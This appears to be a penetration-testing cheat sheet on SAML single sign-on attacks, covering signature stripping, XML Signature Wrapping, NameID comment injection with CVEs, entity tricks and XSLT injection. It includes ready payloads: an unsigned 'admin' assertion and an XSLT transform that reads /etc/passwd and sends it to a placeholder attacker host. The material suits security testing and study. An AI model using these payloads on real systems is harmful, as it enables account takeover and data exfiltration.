entries.title: What SAML SSO is and where to look
entries.body:
SAML (Security Assertion Markup Language) is an open standard for exchanging authentication and authorization data between parties, primarily between an Identity Provider (IdP) and a Service Provider (SP). It is widely used for single sign-on (SSO). Vulnerabilities arise from incorrect implementation or configuration.

Where to look:
• Intercept the SSO flow in Burp/ZAP: look for the SAMLRequest and SAMLResponse parameters (usually base64, sometimes + DEFLATE).
• A SAML Response must contain the element <samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol".
• The receiving endpoint (ACS, Assertion Consumer Service) on the SP side - for example /saml2/sp/acs/post - where the signed assertion is sent.
• Key attack spots: the signature (ds:Signature), Assertion, Subject/NameID, Conditions, AttributeValue.

entries.title: Checklist of SAML attack techniques
entries.body:
1. Invalid Signature - the signature is not from a real CA (self-signed) -> clone the certificate or substitute your own.
2. Signature Stripping - drop the signature block: in the default configuration the signature check may not run at all.
3. XML Signature Wrapping (XSW) - add a cloned unsigned assertion/response next to the legitimate signed one.
4. XML Comment Handling - insert a comment inside NameID to break username parsing.
5. XML External Entity (XXE) - use XML entities to substitute a value without changing the signed content.
6. XSLT - run a transformation via a transform element (file reading, SSRF).
Tools: SAML Raider, XSW Burp extension, ZAP SAML Support.

entries.title: Invalid Signature - cloning a self-signed certificate
entries.body: Signatures that are not signed by a real CA are susceptible to cloning. Make sure the signature is performed by a real CA. If the certificate is self-signed, it can be cloned, or you can create your own self-signed certificate and replace the original with it - after which you sign the tampered assertion with your own key.

entries.title: Signature Stripping - the essence of the attack
entries.body:
"[...] accepting unsigned SAML assertions is accepting a username without verifying the password" - @ilektrojohn

The goal is to craft a well-formed SAML Assertion and NOT sign it. In some default configurations, if the signature section is omitted from the SAML response, the signature check is not performed at all.

entries.title: Example: assertion with NameID=admin without a signature
entries.body:
<?xml version="1.0" encoding="UTF-8"?>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol" Destination="http://localhost:7001/saml2/sp/acs/post" ID="id39453084082248801717742013" IssueInstant="2018-04-22T10:28:53.593Z" Version="2.0">
    <saml2:Issuer xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion" Format="urn:oasis:names:tc:SAML:2.0:nameidformat:entity">REDACTED</saml2:Issuer>
    <saml2p:Status xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol">
        <saml2p:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success" />
    </saml2p:Status>
    <saml2:Assertion xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion" ID="id3945308408248426654986295" IssueInstant="2018-04-22T10:28:53.593Z" Version="2.0">
        <saml2:Issuer Format="urn:oasis:names:tc:SAML:2.0:nameid-format:entity" xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">REDACTED</saml2:Issuer>
        <saml2:Subject xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">
            <saml2:NameID Format="urn:oasis:names:tc:SAML:1.1:nameidformat:unspecified">admin</saml2:NameID>
            <saml2:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
                <saml2:SubjectConfirmationData NotOnOrAfter="2018-04-22T10:33:53.593Z" Recipient="http://localhost:7001/saml2/sp/acs/post" />
            </saml2:SubjectConfirmation>
        </saml2:Subject>
        <saml2:Conditions NotBefore="2018-04-22T10:23:53.593Z" NotOnOrAfter="2018-0422T10:33:53.593Z" xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">
            <saml2:AudienceRestriction>
                <saml2:Audience>WLS_SP</saml2:Audience>
            </saml2:AudienceRestriction>
        </saml2:Conditions>
        <saml2:AuthnStatement AuthnInstant="2018-04-22T10:28:49.876Z" SessionIndex="id1524392933593.694282512" xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">
            <saml2:AuthnContext>
                <saml2:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml2:AuthnContextClassRef>
            </saml2:AuthnContext>
        </saml2:AuthnStatement>
    </saml2:Assertion>
</saml2p:Response>

entries.title: XSW - the essence of the attack
entries.body: The XML Signature Wrapping (XSW) attack: some implementations verify a valid signature and match it to a valid assertion, but do not check for the presence of multiple assertions, multiple signatures, or behave differently depending on the order of assertions. The idea is to add a cloned UNsigned copy next to the legitimate signed one and force the SP to process the forgery instead.

rows: Add a cloned unsigned copy of the Response AFTER the existing signature.
Add a cloned unsigned copy of the Response BEFORE the existing signature.
Add a cloned unsigned copy of the Assertion BEFORE the existing Assertion.
Add a cloned unsigned copy of the Assertion INSIDE the existing Assertion.
Change a value in the signed copy of the Assertion and add a copy of the original Assertion with the signature removed at the END of the SAML message.
Change a value in the signed copy of the Assertion and add a copy of the original Assertion with the signature removed AFTER the original signature.
Add an "Extensions" block with a cloned unsigned assertion.
Add an "Object" block containing a copy of the original assertion with the signature removed.

entries.title: Notation and effect (GitHub Enterprise example)
entries.body:
The example above uses the following notation:
• FA - Forged Assertion
• LA - Legitimate Assertion
• LAS - Signature of the Legitimate Assertion

In the GitHub Enterprise vulnerability such a request passed validation and created a session for the Attacker instead of the Legitimate User - even though FA was not signed.

entries.subcategory: Comment injection in NameID (XML Comment Handling)
entries.title: XML Comment Handling - the essence and affected CVEs
entries.body:
An attacker who already has authenticated access to SSO can authenticate as another user without that user's SSO password. This vulnerability has several CVEs across different libraries and products:
• OneLogin - python-saml - CVE-2017-11427
• OneLogin - ruby-saml - CVE-2017-11428
• Clever - saml2-js - CVE-2017-11429
• OmniAuth-SAML - CVE-2017-11430
• Shibboleth - CVE-2018-0489
• Duo Network Gateway - CVE-2018-7340

Researchers noticed: if you insert a comment inside the username field so that it "cuts" the username, the attacker can gain access to a legitimate user's account.

entries.subcategory: Comment injection in NameID (XML Comment Handling)
entries.title: Illustration of the SAML flaw

meta.caption: Diagram of XML comment handling when parsing the username in SAML: the parser truncates the NameID value at the comment, so user@user.com<!--...-->.evil.com is interpreted as user@user.com. Source: PayloadsAllTheThings.

entries.subcategory: Comment injection in NameID (XML Comment Handling)
entries.title: Payload: comment inside NameID

entries.subcategory: Comment injection in NameID (XML Comment Handling)
entries.title: How the payload is read
entries.body: Here user@user.com is the first part of the username, and .evil.com is the second. Because of comment handling, the vulnerable parser returns only user@user.com, and the attacker authenticates as that legitimate user.

entries.title: XML External Entity - the essence of the attack
entries.body:
An alternative exploitation is to use XML entities to bypass the signature check, since the content is not changed except at the moment of XML parsing.

In the example below:
• &s; resolves to the string "s"
• &f1; resolves to the string "f1"

entries.title: Payload: XML entities in AttributeValue
entries.body:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE Response [
  <!ENTITY s "s">
  <!ENTITY f1 "f1">
]>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol"
  Destination="https://idptestbed/Shibboleth.sso/SAML2/POST"
  ID="_04cfe67e596b7449d05755049ba9ec28"
  InResponseTo="_dbbb85ce7ff81905a3a7b4484afb3a4b"
  IssueInstant="2017-12-08T15:15:56.062Z" Version="2.0">
[...]
  <saml2:Attribute FriendlyName="uid"
    Name="urn:oid:0.9.2342.19200300.100.1.1"
    NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
    <saml2:AttributeValue>
      &s;taf&f1;
    </saml2:AttributeValue>
  </saml2:Attribute>
[...]
</saml2p:Response>

entries.title: Result
entries.body: The SAML response is accepted by the Service Provider. Because of the vulnerability the SP application reports the value "taf" as the value of the "uid" attribute (that is, &s;taf&f1; merged into staff after entity expansion, but the signed text was not changed).

entries.title: XSLT - the essence of the attack
entries.body: An XSLT attack can be performed using a transform element (ds:Transform inside ds:Signature). Through an injected xsl:stylesheet you can read local files and exfiltrate the data (out-of-band / SSRF).

meta.caption: Diagram of an XSLT attack in SAML: a malicious xsl:stylesheet is placed in ds:Transform; while processing the signature the parser performs the transformation, reading a file (for example /etc/passwd) and sending it to the attacker's server. Source: http://sso-attacks.org/XSLT_Attack.

entries.title: Payload: XSLT in ds:Transform (reading /etc/passwd -> exfil)
entries.body:
<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
  ...
    <ds:Transforms>
      <ds:Transform>
        <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
          <xsl:template match="doc">
            <xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
            <xsl:variable name="escaped" select="encode-for-uri($file)"/>
            <xsl:variable name="attackerUrl" select="'http://[ATTACKER.DOMAIN.TLD]/'"/>
            <xsl:variable name="exploitUrl"select="concat($attackerUrl,$escaped)"/>
            <xsl:value-of select="unparsed-text($exploitUrl)"/>
          </xsl:template>
        </xsl:stylesheet>
      </ds:Transform>
    </ds:Transforms>
  ...
</ds:Signature>

rows: Burp Suite extension for XML Signature Wrapping.
Lets you detect, display, edit and fuzz SAML requests.
